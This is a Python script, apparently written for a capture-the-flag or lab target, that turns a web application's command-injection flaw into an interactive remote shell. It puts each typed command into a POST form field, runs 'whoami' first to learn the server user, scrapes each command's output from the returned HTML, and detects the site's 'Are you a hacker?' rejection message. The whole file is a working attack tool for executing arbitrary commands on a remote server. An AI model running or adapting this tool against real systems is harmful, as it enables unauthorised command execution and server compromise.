#!/usr/bin/python3
import requests
import logging
import readline

from bs4 import BeautifulSoup

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
METHOD_POST="POST"
METHOD_GET="GET"

def execute_command(url, method=METHOD_POST,params={}, headers={}, data={}):
    """
    Sends a request to the specified URL with the given parameters and headers.

    Args:
        url (str): The URL to send the request to.
        params (dict): The parameters to include in the request.
        headers (dict): The headers to include in the request.
        data (dict): the data of include in the request

    Returns:
        tuple: A tuple containing the HTTP status code and the content of the HTML response.

    Raises:
        requests.RequestException: If there is an error with the request.
        """

    # Log the start of the function
    logging.debug(f"Starting request to URL: {method} - {url} - {params} - {headers}")

    try:
        # Send the request to the server
        if method==METHOD_GET:
            response = requests.get(url, params=params, headers=headers, data=data)
        elif method==METHOD_POST:
            response = requests.post(url, params=params, headers=headers, data=data)


        # Log the HTTP status code
        logging.debug(f"Received HTTP status code: {response.status_code}")
        logging.debug(f"Received HTML content : {response.text}")

        # Return the HTTP status code and the content of the HTML response
        return response.status_code, response.text

    except requests.RequestException as e:
        # Log any errors that occur
        logging.error(f"An error occurred: {e}")
        raise

def extract_result_from_command_return(html_content, str_valid_command_return, str_wrong_command_return,bs4_selector):
    soup = BeautifulSoup(html_content, 'html.parser')
    cmd_result=''
    valid_result=False
    if str_valid_command_return in html_content:
        valid_result= True
        selector_tags = soup.select(bs4_selector)
        if selector_tags and len(selector_tags)>0:
            cmd_result=selector_tags[0].get_text().strip()
            if len(selector_tags)>1:
                print(f"->Selector {bs4_selector} returned multiple lines, concider choosing a more discriminating selector to return only one result.")
        else:
            print("Success: No valid tag found.")
        
    elif str_wrong_command_return in html_content:
        cmd_result= "Command forbidden"

    return valid_result, cmd_result

def populate_template(cmd, temple_dict):
    """
    Remplace la chaîne "%cmd" dans les valeurs du dictionnaire temple_dict par la valeur de cmd.

    Args:
        cmd (str): La commande à insérer dans les valeurs du dictionnaire.
        temple_dict (dict): Un dictionnaire où les valeurs sont des chaînes de caractères.

    Returns:
        dict: Un nouveau dictionnaire avec les valeurs modifiées.

    Examples:
        >>> cmd = "example_command"
        >>> temple_dict = {
        ...     "key1": "This is a %cmd",
        ...     "key2": "Another %cmd here",
        ...     "key3": "No command here"
        ... }
        >>> populate_template(cmd, temple_dict)
        {'key1': 'This is a example_command', 'key2': 'Another example_command here'}
    """
    populated_dict = {}

    for key, value in temple_dict.items():
        if "%cmd" in value:
            new_value = value.replace("%cmd", cmd)
        else:
            new_value = value
        populated_dict[key] = new_value

    return populated_dict

def populate_template_and_execute_commands(command, str_valid_command_return, str_wrong_command_return,bs4_selector, url, method, template_params, template_headers, template_data):
    # init returned variables
    valid_result=False
    cmd_result=""
    # Execute the command
    populated_params = populate_template(command, template_params)
    populated_headers = populate_template(command, template_headers)
    populated_data = populate_template(command, template_data)

    http_response, html_content = execute_command(url, method=method, params=populated_params, headers=populated_headers, data=populated_data)

    if html_content:
        valid_result, cmd_result = extract_result_from_command_return(html_content, str_valid_command_return, str_wrong_command_return,bs4_selector)
        soup = BeautifulSoup(html_content, 'html.parser')
    else:
        valid_result, cmd_result= (False, "Command processed, but no specific condition met.")

    return valid_result, cmd_result


def main(url, str_valid_command_return, str_wrong_command_return,bs4_selector="html", method=METHOD_POST, template_params={}, template_headers={}, template_data={"command": "%cmd"}):
    """
    Main function to handle user input and process commands.
    """
    command_history = []
    command_index = 0
    
    # Parameters to process cmd returns
    str_valid_command_return=str_valid_command_return
    str_wrong_command_return=str_wrong_command_return
    bs4_selector=bs4_selector

    # Get the user name on the server
    valid_result, user_name=populate_template_and_execute_commands("whoami", str_valid_command_return, str_wrong_command_return,bs4_selector, url, method, template_params, template_headers, template_data)
    if not valid_result:
        user_name="server"

    while True:
        try:
            # Display the prompt
            command = input(f"[{user_name}@{url}]:\r\n ")


            # Exit condition
            if command.lower() == "exit":
                break

            # Add command to history
            if command_index < len(command_history):
                command_history = command_history[:command_index]
                command_history.append(command)
                command_index = len(command_history)

            # Execute the command
            valid_result, cmd_result= populate_template_and_execute_commands(command, str_valid_command_return, str_wrong_command_return,bs4_selector, url, method, template_params, template_headers, template_data)
            print(cmd_result)

        except KeyboardInterrupt:
            break

if __name__ == "__main__":
    str_valid_command_return="blue_boy_typing_nothought.gif"
    str_wrong_command_return="Are you a hacker?"
    bs4_selector='h2'
    method=METHOD_POST
    template_params={}
    template_headers={}
    template_data={"command": "%cmd"}

    url = input("Enter the URL:")
    main(url, str_valid_command_return, str_wrong_command_return, bs4_selector, method=method, template_params=template_params, template_headers=template_headers, template_data=template_data)
